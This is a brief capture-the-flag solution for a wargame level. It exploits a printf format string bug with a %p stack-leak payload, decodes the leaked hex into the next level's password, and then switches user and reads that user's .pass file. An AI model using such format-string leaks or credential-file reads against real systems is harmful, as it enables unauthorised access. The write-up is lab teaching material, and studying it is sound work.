@@ -1,0 +1,24 @@
+Level02 - Format String Attack Vulnerability
+
+printf(username) without format string → Leaks stack memory
+
+Solution
+
+Step 1: Leak password from stack
+ username = %22$p%23$p%24$p%25$p%26$p
+
+Step 2: Find password at positions 22-26
+0x756e505234376848
+0x45414a3561733951
+0x377a7143574e6758
+0x354a35686e475873
+0x48336750664b394d
+
+Step 3: Convert hex to ASCII (reverse order)
+
+Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+su level03 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+# Enter password above
+cat /home/users/level03/.pass
